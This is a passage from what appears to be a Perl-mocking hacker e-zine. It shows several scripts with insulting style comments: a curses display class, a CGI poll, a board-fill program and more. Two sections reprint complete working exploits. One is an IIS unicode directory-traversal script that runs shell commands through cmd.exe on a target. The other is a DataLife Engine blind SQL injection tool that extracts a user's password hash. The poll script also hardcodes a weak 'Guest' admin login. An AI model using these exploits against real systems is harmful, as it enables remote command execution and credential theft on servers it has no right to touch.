	for( my $i = MAX; $i &gt;= 0; $i-- )
		{
		$self-&gt;size( $i, undef );
		$self-&gt;name( $i, &#39;&#39; );
		}

	}

sub DESTROY { endwin; }

sub add
	{
	my $self = shift;

	my( $size, $name ) = @_;

	# add new entries at the end
	if( $size &gt; $self-&gt;size( MAX ) )
		{
		$self-&gt;last( $size, $name );
		$self-&gt;sort;
		}

	$self-&gt;draw();
	}

sub sort
	{
	my $self = shift;
	no warnings;
	# do what you have to do
	$self-&gt;elements(
		sort { $b-&gt;[SIZE] &lt;=&gt; $a-&gt;[SIZE] } $self-&gt;elements
		);

	%rindex = map { $self-&gt;name( $_ ), $_ } 0 .. MAX - 1;
	# quite the choppy solution, a global, despite the solid OO design
	}

sub elements
	{
	my $self = shift;

	if( @_ ) { @$self = @_ }

	@$self;
	# The long overly cautious road.
	}

sub size
	{
	my $self  = shift;
	my $index = shift || -1;

	if( @_ ) { $self-&gt;[$index][SIZE] = shift }

	$self-&gt;[$index][SIZE] || 0;
	# If you must
	}

sub name
	{
	my $self  = shift;
	my $index = shift || -1;

	if( @_ ) { $self-&gt;[$index][NAME] = shift }

	$self-&gt;[$index][NAME] || &#39;&#39;;
	}

sub last
	{
	my $self = shift;

	if( @_ )
		{
		$self-&gt;size( -1, shift );
		$self-&gt;name( -1, shift || &#39;&#39; );
		}

	( $self-&gt;size( -1 ), $self-&gt;name( -1 ) );
	}

sub draw
	{
	my $self = shift;

	for( my $i = 0; $i &lt; MAX; $i++ )
	# no Perl style for-loop?
		{
		next if $self-&gt;size( $i ) == 0 or $self-&gt;name( $i ) eq &#39;&#39;;

		$win-&gt;addstr( $i,  1, &quot; &quot; x $Curses::COLS );
		$win-&gt;addstr( $i,  1, sprintf( &quot;%8d&quot;, $self-&gt;[$i][SIZE] || &#39;&#39; )  );
		$win-&gt;addstr( $i, 10, $self-&gt;name( $i ) );
		$win-&gt;refresh;
		}

	}

There. Its over. It hurt us more than you! Hardly a rubbing at all.
Softest writeup yet.

-[0x12] # School You: davido ---------------------------------------------

#!/usr/local/bin/perl -T

# poll.cgi:  Creates an HTML form containing a web poll (or 
# questionaire).


use strict;
use warnings;
use CGI::Pretty;
use CGI::Carp qw( fatalsToBrowser );

# ------------------ Begin block ------------------------------------
# This script uses the BEGIN block as a means of providing CGI::Carp
# with an alternate error handler that sends fatal errors to the
# browser instead of the server log.

BEGIN {
	sub carp_error {
		my $error_message = shift;
		my $cq = new CGI;
		print $cq-&gt;start_html( &quot;Error&quot; ),
			  $cq-&gt;h1(&quot;Error&quot;),
			  $cq-&gt;p( &quot;Sorry, the following error has occurred: &quot; ),
			  $cq-&gt;p( $cq-&gt;i( $error_message ) ),
			  $cq-&gt;end_html;
	}
	CGI::Carp::set_message( \&amp;carp_error );
}

# ----------------- Script Configuration Variables ------------------

# Script&#39;s name.
my $script = &quot;poll.cgi&quot;;

# Poll Question filehandle.
# Questions will be read from &lt;DATA&gt;.  Unset $question_fh if
# you wish to read from an alternate question file.
my $question_fh = \*DATA;

# Poll Question File path/filename.
# Set $question_file to the path of alternate question file.
# Empty string means read from &lt;DATA&gt; instead of an external file.							
my $question_file = &quot;&quot;;

# Set path to poll tally file. File must be readable/writable by all.
# For an added degree of obfuscated security ensure that the file&#39;s
# directory is not readable or writable by the outside world.
my $poll_data_path = &quot;../polldata/poll.dat&quot;;

# Administrative User ID and Password. This is NOT robust.  
# It prevents casual snoopers from seeing results of poll.
my $adminpass = &quot;Guest&quot;;
my $userid = &quot;Guest&quot;;

# -------------------- File - scoped variables ----------------------

# Create the CGI object:
my $q = new CGI;


# -------------------- Main Block -----------------------------------

MAIN_SWITCH: {
	my $poll_title;
	# If the parameter list from the server is empty, we know
	# that we need to output the HTML for the poll.
	!$q-&gt;param() &amp;&amp; do {
		$poll_title = print_poll(	$question_fh, 
									$question_file, 
									$script, 
									$q );
		last MAIN_SWITCH;
	};
	# If the user hit the &quot;Enter&quot; submit button, having supplied a
	# User ID and Password, he wants to see the poll&#39;s tally page.
	defined $q-&gt;param(&#39;Enter&#39;) &amp;&amp; do {
		if ( 	$q-&gt;param(&quot;Adminpass&quot;) eq $adminpass and
				$q-&gt;param(&quot;Userid&quot;   ) eq $userid )		{
			my $results = get_results ( $poll_data_path );
			print_results(	$question_fh,
							$question_file,
							$results,
							$q );
		} else {
			action_status(&quot;NO_ADMIN&quot;, $poll_title, $q);
		}
		last MAIN_SWITCH;
	};
	# If the user hit the &quot;Submit&quot; submit button, having answered
	# all of the poll&#39;s questions, he wants to submit the poll.
	defined $q-&gt;param(&#39;Submit&#39;) &amp;&amp;  do {
		if ( verify_submission( $q ) ) {
			write_entry( $poll_data_path, $q );
			action_status(&quot;THANKS&quot;, $poll_title, $q);
		} else {
			$q-&gt;delete_all;
			action_status(&quot;INCOMPLETE&quot;, $poll_title, $q);
		}
		last MAIN_SWITCH;
	};
	# If we fall to this point it means we don&#39;t know *what* the
	# user is trying to do (probably supplying his own parameters!
	action_status(&quot;UNRECOGNIZED&quot;, $poll_title, $q);
}
$q-&gt;delete_all;		# Clear parameter list as a last step.
# We&#39;re done!  Go home!

# -------------------- End Main Block -------------------------------

# -------------------- The workhorses (subs) ------------------------

# Verify the poll submission is complete.
# Pass in the CGI object.  Returns 1 if submission is complete.
# Returns zero if submission is incomplete.

sub verify_submission {
	my $q = shift;
	my $params = $q-&gt;Vars;
	my $ok = 1;
	foreach my $val ( values %$params ) {
		if ( $val eq &quot;Unanswered&quot; ) {
			$ok = 0;
			last;
		}
	}
	return $ok;
}


# Write the entry to our tally-file.  Entry consists of a series of
# sets.  A set is a question ID followed by its answer token.
# Pass in the path to the tally file and the CGI object.
# Thanks tye for describing how an append write occurs as an
# atomic entity, thus negating the need for flock if entire record
# can be output at once (at least that&#39;s what I think you told me).

sub write_entry {
	my ( $outfile, $q ) = @_;
	my $output=&quot;&quot;;
	my %input = map { $_ =&gt; $q-&gt;param($_) } $q-&gt;param;
	foreach (keys %input) {
		$output .= &quot;$_, $input{$_}\n&quot; if defined $input{$_};
	}
	open POLLOUT, &quot;&gt;&gt;$outfile&quot; 
		or die &quot;Can&#39;t write to tracking file\n$!&quot;;
	print POLLOUT $output;
	close POLLOUT or die &quot;Can&#39;t close tracking file\n$!&quot;;
}


# Read and tabulate results of poll entries from the data file.
# Results are tabulated by adding up the number of times each
# answer token appears, for each question.
# Pass in filename.  Returns a reference to a hash of hashes 
# that looks like $hash{question_id}{answer_id}=total_votes.

sub get_results {
	my $datafile = shift;
	my %tally;
	open POLLIN, &quot;&lt;$datafile&quot; 
		or die &quot;Can&#39;t read tracking file.\n$!&quot;;
	while (my $response = &lt;POLLIN&gt; ) {
		chomp $response;
		my ( $question, $answer ) = split /,\s*/, $response;
		$tally{$question}{$answer}++;
	}
	close POLLIN;
	return \%tally;
}


# Output a results page to the browser.  Reads the original 
# question file (or DATA) to properly associate the text of the
# questions and answers with the tags stored in the tally hash.
# Pass in the q-file filehandle, the q-file name (blank if &lt;DATA&gt;),
# the reference to the tally-hash, and the CGI object.

sub print_results {
	my ( $fh, $qfile, $tally, $q ) = @_;
	if ( $qfile ) {
		$fh = undef;
		open $fh, &quot;&lt;&quot;.$qfile or die &quot;Can&#39;t open $qfile.\n$!&quot;;
	}
	my $script_url = $q-&gt;url( -relative =&gt; 1 );
	my $title = &lt;$fh&gt;;
	chomp $title;
	$title .= &quot;Results&quot;;
	print	$q-&gt;header( &quot;text/html&quot; ),
			$q-&gt;start_html( $title ),
			$q-&gt;h1( $title ),
			$q-&gt;p;
	while ( my $qset = get_question( $fh ) ) {
		print &quot;Question: $qset-&gt;{id}: $qset-&gt;{question}:&lt;br&gt;&lt;ul&gt;&quot;;
		foreach my $aset ( @{$qset-&gt;{&#39;answers&#39;}} ) {
			if ( exists $tally-&gt;{$qset-&gt;{id}}{$aset-&gt;{token}} ) {
				print	&quot;&lt;li&gt;$aset-&gt;{text}: &quot;,
						&quot;$tally-&gt;{$qset-&gt;{id}}{$aset-&gt;{token}}.&quot;;
			}	
		}
		print &quot;&lt;/ul&gt;&lt;p&gt;&quot;
	}
	if ( $qfile ) {
		close $fh or die &quot;Can&#39;t close $qfile.\n$!&quot;;
	}
	print	$q-&gt;hr,
			$q-&gt;p(	&quot;Total Respondents: &quot;,
					&quot;$tally-&gt;{&#39;Submit&#39;}{&#39;Submit&#39;}.&quot; ),
			$q-&gt;hr,
			$q-&gt;p( &quot;&lt;a href=$script_url&gt;Return to poll&lt;/a&gt;&quot;),
			$q-&gt;end_html;
}


# Outputs the HTML for the poll.
# Pass in the filehandle to the poll&#39;s question file,
# its filename (empty string if &lt;DATA&gt;), script name,
# and CGI object.

sub print_poll {
	my ( $fh, $infile, $scriptname, $q ) = @_;
	if ( $infile ) {
		$fh = undef;
		open $fh, &quot;&lt;&quot;.$infile or die &quot;Can&#39;t open $infile.\n$!&quot;;
	}
	my $polltitle = &lt;$fh&gt;;
	chomp $polltitle;
	print	$q-&gt;header( &quot;text/html&quot; ),
			$q-&gt;start_html( -title =&gt; $polltitle),
			$q-&gt;h1( $polltitle ),
			$q-&gt;br,
			$q-&gt;hr,
			$q-&gt;start_form( -method =&gt; &quot;post&quot;, 
							-action =&gt; $scriptname );
	while ( my $qset = get_question( $fh ) ) {
		my ( %labels, @vals );
		foreach ( @{$qset-&gt;{&#39;answers&#39;}} ) {
			push @vals, $_-&gt;{&#39;token&#39;};
			$labels{ $_-&gt;{&#39;token&#39;} } = $_-&gt;{&#39;text&#39;};
		}
		push @vals, &quot;Unanswered&quot;;
		$labels{&#39;Unanswered&#39;} = &quot;No Response&quot;;
		print	$q-&gt;p( $q-&gt;h3( $qset-&gt;{&#39;question&#39;} ) ),
				$q-&gt;radio_group(
					-name 		=&gt; $qset-&gt;{&#39;id&#39;},
					-default	=&gt; &quot;Unanswered&quot;,
					-values		=&gt; \@vals,
					-labels		=&gt; \%labels,
					-linebreak =&gt; &quot;true&quot; );
	}
	print	$q-&gt;p, $q-&gt;p,
			$q-&gt;submit(	-name =&gt; &quot;Submit&quot; ),
			$q-&gt;reset,
			$q-&gt;endform,
			$q-&gt;br,
			$q-&gt;p,
			$q-&gt;p,
			$q-&gt;hr,
			$q-&gt;start_form( -method =&gt; &quot;post&quot;, 
							-action =&gt; $scriptname ),,
			$q-&gt;p($q-&gt;h3(&quot;Administrative use only.&quot;) ),
			$q-&gt;p(	&quot;ID: &quot;,
					$q-&gt;textfield(	-name =&gt;&quot;Userid&quot;, 
									-size =&gt; 25, 
									-maxlength =&gt; 25 ),
					&quot;Password: &quot;, 
					$q-&gt;password_field( -name =&gt; &quot;Adminpass&quot; ),
					$q-&gt;submit(	-name =&gt; &quot;Enter&quot; ) ),
			$q-&gt;endform,
			$q-&gt;end_html;
	if ( $infile ) {
		close $fh or die &quot;Can&#39;t close $infile.\n$!&quot;;
	}
	return $polltitle;
}


# Outputs an HTML status page based on the action requested.
# This routine is used to thank the user for taking the poll, or
# to blurt out user-caused warnings.
# Pass in the action type, poll title, and the CGI object.

sub action_status {
	my ( $action, $title, $q ) = @_;
	print	$q-&gt;header( &quot;text/html&quot; ),
			$q-&gt;start_html( -title =&gt; $title.&quot; Status&quot; ),
			$q-&gt;h1( $title.&quot; Status&quot; ),
			$q-&gt;hr;
	my ( $headline, @text, $script_url );
	$script_url = $q-&gt;url( -relative =&gt; 1 );
	RED_SWITCH: {
		$action eq &#39;NO_ADMIN&#39;	&amp;&amp; do { 
			$headline = &quot;Access Denied&quot;;
			@text = (	&quot;This section is for administrative &quot;,
						&quot;use only.&lt;p&gt;&quot;,
						&quot;&lt;a href = $script_url&gt;Return to poll.&lt;/a&gt;&quot; );
			last RED_SWITCH;
		};
		$action eq &#39;THANKS&#39;		&amp;&amp; do {
			$headline = &quot;Thanks for taking the poll.&lt;p&gt;&quot;;
			@text = ( &quot;&quot; );
			last RED_SWITCH;
		};
		$action eq &#39;INCOMPLETE&#39; &amp;&amp; do {
			$headline = &quot;Error: You must answer all poll questions.&quot;;
			@text = (	&quot;Please complete poll, and submit again.&lt;p&gt;&quot;,
						&quot;&lt;a href = $script_url&gt;Return to poll.&lt;/a&gt;&quot;	);
			last RED_SWITCH;
		};
		$action eq &#39;UNRECOGNIZED&#39; &amp;&amp; do {
			$headline = &quot;Error: Unrecognized form data.&quot;;
			@text = ( &quot;&quot; );
			last RED_SWITCH;
		};
	}
	print	$q-&gt;h3( $headline ),
			$q-&gt;p(  @text     ),
			$q-&gt;end_html;
}


# Gets a single question and its accompanying answer set from
# the filehandle passed to it.
# Returns a structure containing a single Q/A set.  A poll will
# generally consist of a number of Q/A sets, so this function
# is usually called repeatedly to build up the poll.

sub get_question {
	my $fh = shift;
	my ( $question_id, $question, @answers, %set );
	GQ_READ: while ( my $line = &lt;$fh&gt; ) {
		chomp $line;
		GQ_SWITCH: {
			$line eq &quot;&quot;	  &amp;&amp; do { next GQ_READ }; # Ignore blank.
			$line =~ /^#/ &amp;&amp; do { next GQ_READ }; # Ignore comments.
			$line =~ /^Q/ &amp;&amp; do { 	# Bring in a question.
				die &quot;Multiple questions\n&quot; 
					if $question_id or $question;
				( $question_id, $question ) = $line =~ 
					/^Q(\d+):\s*(.+?)\s*$/; 
				last GQ_SWITCH;
			};
			$line =~ /^A/ &amp;&amp; do {	# Bring in an answer.
				my ( $token, $text ) =  $line =~
					/^A:\s*(\S+)\s*(.+?)\s*$/;
				die &quot;Bad answer.\n&quot; unless $token and $text;
				push @answers, {(	&#39;token&#39; =&gt;$token, 
									&#39;text&#39;=&gt;$text	)};
				last GQ_SWITCH;
			};
			$line =~ /^E/ &amp;&amp; do {	# End input, assemble structure.
				die &quot;Set missing components.\n&quot; 
					unless $question and @answers;
				$set{&#39;id&#39;} 			= $question_id;
				$set{&#39;question&#39;}	= $question;
				$set{&#39;answers&#39;}		= \@answers;
				last GQ_SWITCH;
			};
		}
		return \%set if %set;
	}
	return 0;	# This is how we signal nothing more to get.
}


# -------------------- &lt;DATA&gt; based poll ----------------------------

# First line of DATA section should be the Poll title.

__DATA__
Dave&#39;s Poll

# Format:  Comments allowed if line begins with #.
# Blank lines allowed.
# Data lines must begin with a tag: Qn:, A:, or E.
# Any amount of whitespace separates answer tokens from text.
# Other whitespace is not significant.
# Complete sets must be Qn, A:, A:...., E.
# If you choose to use an external question file, comment out
# but retain as an example at least one question from below.

Q1:	Does the poll appear to work?
A:	++++	Big Success!
A:	+++		Moderate Success!
A:	++		Decent Success!
A:	+		Success!
A:	-		Minor Unsuccess.
A:	--		Some Unsuccess.
A:	---		Moderate Unsuccess.
A:	----	Monumental Disaster!
E

Q2: Did you find serious issues?
A:	!!		Yes, serious!
A:	!		Yes, minor.
A:	*		Mostly no.
A:	**		Perfect!
E

Q3: Regarding this poll:
A:	+++		You could take it over and over again all day!
A:	++		Kinda nifty.
A:	+		Not bad.
A:	-		Yawn...
A:	--		Zzzzzzz....
A:	---		Arghhhhh, get this off my computer!
E

Q4: You spend too much time on the computer.
A:	T		True.
A:	F		False.
A:	H		Huh?
E

Q5: You&#39;re sick of answering questions.
A:	++		Definately.
A:	+		Somewhat.
A:	-		Bring them on!
E

-[0x13] # AntiSec AntiPerl -----------------------------------------------

#!/usr/bin/perl
# 
# exploit for the windows IIS unicode hole
# this perl script makes the thinks nicer
#
# written by newroot
# 
# greetz to mcb, nopfish, merith
# and the whole antisec.de team
#
# http://www.antisec.de
#

use Getopt::Std;
use IO::Socket;
use IO::Select;

#1 == white

my @unis=(
		&quot;/scripts/..%c0%af..&quot;,
		&quot;/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..&quot;,
		&quot;/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..&quot;,
		&quot;/msadc/..%c0%af../..%c0%af../..%c0%af..&quot;,
		&quot;/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..&quot;,
		&quot;/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..&quot;,
		&quot;/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..&quot;,
		&quot;/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..&quot;
	);
# qw that shit, biatch

sub ussage () {
	print &quot;\033[1mremote ISS unicode exploit\033[0m\r\n&quot;;
	print &quot;\033[0mwritten by newroot\033[0m\r\n\n&quot;;
	print &quot;Usage doublepimp.pl [options] &lt;target&gt; &lt;command&gt;\n&quot;;
	print &quot;\t\t-p &lt;port&gt;\toptional port number if not 80\n&quot;;
	print &quot;\t\t-d &lt;altanative directory&gt;\tuse this path instance of /winnt/system32\n&quot;;
	print &quot;\t\t-v\t\t\tverbose output\n&quot;;
	exit 0;
}
# I believe its spelt &#39;usage&#39;, and that&#39;s some ugly quoting

sub connect_host () {
	my $host = shift;
	my $port  = shift;

	my $socket = IO::Socket::INET-&gt;new (PeerAddr =&gt; $host, 
					 PeerPort =&gt; $port,
					 Proto =&gt; &quot;tcp&quot;,
					 Type=&gt;SOCK_STREAM,
					) or die &quot;[-] Cant connect to target!\n&quot;;
	return $socket;
}

sub my_send () {
	my $socket = shift;
	my $buf = shift;
	my @result;

	print $socket $buf;
	select($socket);
	$|=1;
	while (&lt;$socket&gt;) {
		push (@result, $_);
	}
	# @result = &lt;$socket&gt;;

	select(STDOUT);

	return @result;
}

### MAIN ###
	#not going to make this one lexical, I see
	%option =();
	my @result;
	my $target_num;
	my $break;
	my $command;
	my $port;
	my $path;
	# those could all go on one line! 
	# but then your script would have less lines! o no!

	getopts (&quot;h:p:d:v&quot;, \%option);

	if (!defined($ARGV[0])) {
		&amp;ussage ();
	}
	if (!defined($ARGV[1])) {
		&amp;ussage ();
	}
	# what..the...fuck
	# you moron
	# ussage() unless $ARGV[1]; # whatever - covers the whole block

	if (defined($option{p})) {
		$port = $option{p};
	} else {
		$port = 80;
	}
	# $port = $options{&#39;p&#39;} || 80;
	
	if (defined($option{d})) {
		$path = $option{d};
	} else {
		$path = &quot;/winnt/system32/&quot;;
	}
	
#I can&#39;t stomach much more of this...

	$target = $ARGV[0];
	$break =  0;
	$target_num = 0;

	        $target = $ARGV[0]; # we got it the first time
        $port = $port; # no shit
        $break =  0; # clarifying?
        $target_num = 0; # uh..

# let me ask you this. what kind of moron releases such shitty code
# without even looking over it

        foreach my $uni (@unis) {
		# excuse me while I throw up
                print &quot;[+] Connecting to $ARGV[0]:$port\n&quot; if (defined($option{v}));
                my $socket = &amp;connect_host($ARGV[0], $port);
                print &quot;[+] Connected  to $ARGV[0]:$port\n&quot; if (defined($option{v}));
                print &quot;[+] Trying $uni\n&quot; if (defined($option{v}));
                @result = &amp;my_send ($socket, &quot;GET $uni/winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n&quot;);
                close ($socket);

		# ok I&#39;m back. glad I missed that
                foreach my $line (@result) {
			# we have this kickass grep command, learn it
                        if ($line =~ /Verzeic/) {
                                $break = 1;
                                break;
                        }
                }
                if ($break eq 1) {
		# ==, dickface
                        print &quot;[+] Found working string $uni\n&quot; if (defined($option{v}));
                        goto working;
			# GOTO! WOO
                        break;
                } else {
                        $target_num++;
                }
        }

	die &quot;[-] Sorry no working string found!\n[-] Server maybee not vunable!&quot;;



working:
	my $socket = &amp;connect_host($ARGV[0], $port);
	
	$ARGV[1] =~ /([A-z0-9\.]+)/;
	$command = $1;
	$ARGV[1] =~s/$command//g;
	$ARGV[1] =~s/ /\+/g;
	# well isn&#39;t that interesting...

	print &quot;[+] Sending GET $unis[$target_nr]$path$command?$ARGV[1] HTTP/1.0\r\n\r\n&quot;;
	@result = &amp;my_send ($socket, &quot;GET $unis[$target_nr]$path$command?$ARGV[1] HTTP/1.0\r\n\r\n&quot;);
	close ($socket);
	# yuck, yuck, and yuck

	print @result;
	# finally a line I like
### DA END ###
# thank god

-[0x14] # School You: atcroft --------------------------------------------

##### It&#39;s from 2001, so don&#39;t try any &quot;look thats bad!&quot; shit. Just enjoy

#!/usr/local/bin/perl --
# use strict;

if ($#ARGV &lt; 0) {
	&amp;display_usage;
	exit(0);
}

my $datafile = $ARGV[0] || $0 . &#39;.txt&#39;;
my ($height, $width, $bcharlist, @board) = &amp;read_data($datafile);
my @borderchars = split(&#39;&#39;, $bcharlist);

&amp;display_board($width, $height, 0, @board);

my $changes = $height * $width;
my $passes = 0;
while ($changes &gt; 0) {
	$changes = 0;
	$passes++;
	for (my $y = 0; $y &lt; $height; $y++) {
		for (my $x = 0; $x &lt;= $#{$board[$y]}; $x++) {
			next	if (&amp;is_border($board[$y][$x]));
			my $sum = &amp;count_neighbors($x, $y, 
						$width, $height, \@board);
			if ($sum &gt;= 3) {
				$changes++;
				$board[$y][$x] = $borderchars[0];
			}
		}
	}
}

&amp;display_board($width, $height, $passes, @board);

sub read_data {
	my ($filename) = @_;
	my $h = 0, $w = 0, $charlist = &#39;#&#39;;
	my (@board);
	open(DATAFILE, $filename) or die(&quot;Can&#39;t open $filename : $!\n&quot;);
		while (my $line = &lt;DATAFILE&gt;) {
			chomp($line);
			next		unless (length($line));
			next		if ($line =~ m/^#/); 

			my @parts = split(/\s*[:=]\s*/, $line, 2);
			$w = $parts[1]	if ($parts[0] =~ m/width|x/i);
			$h = $parts[1]	if ($parts[0] =~ m/height|y/i);
			$charlist = $parts[1]
				if ($parts[0] =~ m/border|wall|char/i);
			if ($parts[0] =~ m/board|screen/i) {
				for (my $i = 0; $i &lt; $w; $i++) {
					$line = &lt;DATAFILE&gt;;
					chomp($line);
					@{$board[$i]} = split(&#39;&#39;, $line);
				}
			}
		}
	close(DATAFILE);
	return($h, $w, $charlist, @board);
}
sub display_board {
	my ($i, $j, $pass, @screen) = @_;
	printf(&quot;Pass : %d\nHeight : %d, Width : %d\nBoard : \n&quot;,
		$pass, $j, $i);
	for (my $y = 0; $y &lt; $j; $y++) 
		{ print(join(&#39;&#39;, @{$screen[$y]}, &quot;\n&quot;)); }
	print(&quot;\n&quot;);
}
sub is_border {
	my ($character) = @_;
	return(scalar(grep(/$character/, @borderchars)));
}
sub count_neighbors {
	local ($i, $j, $w, $h, *screen) = @_;
	my $ncount = 0;
	if ($j &gt; 0)
		{ $ncount++	if (&amp;is_border($screen[$j - 1][$i])); }
	if ($j &lt; ($h - 1))
		{ $ncount++	if (&amp;is_border($screen[$j + 1][$i])); }
	if ($i &gt; 0)
		{ $ncount++	if (&amp;is_border($screen[$j][$i - 1])); }
	if ($i &lt; $w)
		{ $ncount++	if (&amp;is_border($screen[$j][$i + 1])); }
	return($ncount);
}
sub display_usage {
	while (&lt;DATA&gt;) {
		s/\$0/$0/;
		print $_	unless (m/^__DATA__$/);
	}
}
__END__
__DATA__
Program execution:
	$0 filename

where filename is the name of the data file to use.

Datafile format:
&lt;line&gt; : &lt;parameter1&gt;&lt;seperator&gt;&lt;parameter1_value&gt;
&lt;line&gt; : &lt;parameter2&lt;seperator&gt;parameter2_value&gt;
&lt;line&gt; : &lt;parameter2&gt;&lt;seperator&gt;
&lt;line&gt; : &lt;dataline&gt;

&lt;seperator&gt; : &lt;space&gt;*[&#39;=&#39;|&#39;:&#39;]&lt;space&gt;*
&lt;parameter1&gt; : [&#39;height&#39;|&#39;width&#39;|&#39;x&#39;|&#39;y&#39;]
&lt;parameter1_value&gt; : &lt;number&gt;
&lt;parameter2&gt; : [&#39;border&#39;|&#39;wall&#39;|&#39;char&#39;]
&lt;parameter2_value&gt; : &lt;string1&gt;
&lt;dataline&gt; : &lt;string2&gt;

&lt;number&gt; : &lt;digit&gt;+
&lt;string1&gt; : &lt;non_whitespace&gt;+
&lt;string2&gt; : &lt;character&gt;

&lt;digit&gt; : (equivalent to perl regex /\d/)
&lt;space&gt; : (equivalent to perl regex /\s/)
&lt;non_whitespace&gt; : (equivalent to perl regex /\S/)
&lt;character&gt; : (matched by perl regex /./)

Sample file:
x:4
y= 3
wall=#
screen=
## #
#  #
# ##

-[0x15] # Russian for the fall -------------------------------------------

#!/usr/bin/perl 

## DataLife Engine sql injection exploit by RST/GHC 
## (c)oded by 1dt.w0lf 
## RST/GHC 
## http://rst.void.ru 
## http://ghc.ru 
## 18.06.06 

# STRICT STRICT STRICT STRICT STRICT
# WARNINGS WARNINGS WARNINGS WARNINGS
# STRICT STRICT STRICT STRICT STRICT
# WARNINGS WARNINGS WARNINGS WARNINGS
# STRICT STRICT STRICT STRICT STRICT
# WARNINGS WARNINGS WARNINGS WARNINGS

use LWP::UserAgent; 
use Getopt::Std; 

getopts(&#39;u:n:p:&#39;); 

$url  = $opt_u; 
$name = $opt_n; 
$prefix = $opt_p || &#39;dle_&#39;; 

if(!$url || !$name) { &amp;usage; } 

$s_num = 1; 
$|++; 
$n = 0;
# step by step right? 
&amp;head; 
# head();
print &quot;\r\n&quot;; 
# CAPITAL LETTERS
print &quot; [~]      URL : $url\r\n&quot;; 
print &quot; [~] USERNAME : $name\r\n&quot;; 
print &quot; [~]   PREFIX : $prefix\r\n&quot;; 
$userid = 0; 
print &quot; [~] GET USERID FOR USER \&quot;$name\&quot; ...&quot;; 
$xpl = LWP::UserAgent-&gt;new() or die; 
$res = $xpl-&gt;get($url.&#39;?subaction=userinfo&amp;user=&#39;.$name); 
if($res-&gt;as_string =~ /do=lastcomments&amp;userid=(\d*)/) { $userid = $1; } 
elsif($res-&gt;as_string =~ /do=pm&amp;doaction=newpm&amp;user=(\d*)/) { $userid = $1; } 
elsif($res-&gt;as_string =~ /do=feedback&amp;user=(\d*)/) { $userid = $1; } 
if($userid != 0 ) { print &quot; [ DONE ]\r\n&quot;; } 
else { print &quot; [ FAILED ]\r\n&quot;; exit(); } 

# please don&#39;t make me look at code like that again
# no further comment on that

print &quot; [~]   USERID : $userid\r\n&quot;; 

print &quot; [~] SEARCHING PASSWORD ...  &quot;; 

while(1) 
{ 
if(&amp;found(47,58)==0) { &amp;found(96,103); } 
# heh heh
$char = $i; 
if ($char==&quot;0&quot;) 
 { 
 if(length($allchar) &gt; 0){ 
 print qq{\b  [ DONE ] 
 --------------------------------------------------------------- 
  USERNAME : $name 
    USERID : $userid 
  PASSHASH : $allchar 
 --------------------------------------------------------------- 
 }; 
 # you know qq! Do you know it is the same as &quot;
 } 
 else 
 { 
 print &quot;\b[ FAILED ]&quot;; 
 } 
 exit();  
 } 
else 
 {  
 $allchar .= chr($char); 
 print &quot;\b&quot;.chr($char).&quot; &quot;; 
 } 
$s_num++; 
# spaghetti in the morning, spaghetti in the evening, spaghetti code EVERYWHERE
} 

sub found($$) 
# prototypes? hold your horse, lone ranger!
 { 
 my $fmin = $_[0]; 
 my $fmax = $_[1]; 
 if (($fmax-$fmin)&lt;5) { $i=crack($fmin,$fmax); return $i; } 
# you can do return crack($fmin, $fmas); noob
# instead you&#39;ll mess with a non-lexical variable for the heck of it
  
 $r = int($fmax - ($fmax-$fmin)/2); 
 $check = &quot;/**/BETWEEN/**/$r/**/AND/**/$fmax&quot;; 
 if ( &amp;check($check) ) { &amp;found($r,$fmax); } 
 else { &amp;found($fmin,$r); } 
# I am shaking
 } 
  
sub crack($$) 
 { 
 my $cmin = $_[0]; 
 my $cmax = $_[1]; 
 $i = $cmin; 
 while ($i&lt;$cmax) 
  { 
  $crcheck = &quot;=$i&quot;; 
  if ( &amp;check($crcheck) ) { return $i; } 
  $i++; 
  } 
 # for loop, dipshit

 $i = 0; 
 return $i; 
 } 
  
sub check($) 
 { 
# no reason at all to use a prototype
 $n++; 
 status(); 
 $ccheck = $_[0]; 
 $xpl = LWP::UserAgent-&gt;new() or die; 
 $res = $xpl-&gt;get($url.&#39;?subaction=userinfo&amp;user=&#39;.$name.&#39;%2527 and ascii(substring((SELECT password FROM &#39;.$prefix.&#39;users WHERE user_id=&#39;.$userid.&#39;),&#39;.$s_num.&#39;,1))&#39;.$ccheck.&#39;/*&#39;); 
 if($res-&gt;as_string =~ /$name&lt;\/td&gt;/) { return 1; } 
 else { return 0; } 
 } 
  
sub status() 
{ 
  $status = $n % 5; 
  if($status==0){ print &quot;\b/&quot;;  } 
  if($status==1){ print &quot;\b-&quot;;  } 
  if($status==2){ print &quot;\b\\&quot;; } 
  if($status==3){ print &quot;\b|&quot;;  } 
  # you can spread out this syntax a bit if you would like. You know, make it cute and all
  # not to mention you can use elsif
  # or just print &quot;\b-&quot; if $status == 0;
} 

sub usage() 
 { 
 &amp;head; 
# needs its own sub? then call it like a man. head()

 print q( 
  USAGE: 
  r57datalife.pl [OPTIONS] 
  
  OPTIONS: 
  -u &lt;URL&gt;      - path to index.php 
  -n &lt;USERNAME&gt; - username for bruteforce 
  -p [prefix]   - database prefix 
  
  E.G. 
  r57datalife.pl -u http://server/index.php -n admin 
 --------------------------------------------------------------- 
 (c)oded by 1dt.w0lf 
 RST/GHC , http://rst.void.ru , http://ghc.ru 
 ); 
 exit(); 
 } 
sub head() 
 { 
 print q( 
 --------------------------------------------------------------- 
       DataLife Engine sql injection exploit by RST/GHC 
 --------------------------------------------------------------- 
 ); 
 }

# Too much overhead. Too much crap. A complete mess. Learn to code
# Learn to design

-[0x16] # Hello s0ttle ---------------------------------------------------

s0ttle, friend, where have you been? Taking some time off? Retreating from the scene?

You were once a Perl darling. Learning intelligently, you built up a little list of cute scripts.
You learned in Perl Monks, and you contributed back to the community. Here, have a list of your
contributions:

2002ï¿½..01ï¿½..13	s0ttle	Re: Code Review! Go Ahead, Rip It Up!	Re:SoPW
2002ï¿½..01ï¿½..01	s0ttle	Managing C structs -with Perl-	SoPW
2001ï¿½..12ï¿½..28	s0ttle	Re: (Ovid) Re: Assigning CGI object data	Re:SoPW
2001ï¿½..12ï¿½..28	s0ttle	Assigning CGI object data	SoPW
